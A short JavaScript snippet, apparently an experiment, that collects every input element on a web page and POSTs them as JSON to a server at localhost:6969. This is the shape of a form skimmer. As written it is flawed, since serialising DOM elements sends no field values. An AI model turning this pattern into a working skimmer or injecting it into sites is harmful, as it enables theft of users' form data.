console.log("yes");
fetch("http://localhost:6969", {
  method: "POST",
  body: JSON.stringify({
    inptarry: Array.from(document.querySelectorAll('input')),
  }),
  headers: {
    "Content-type": "application/json; charset=UTF-8"
  }
});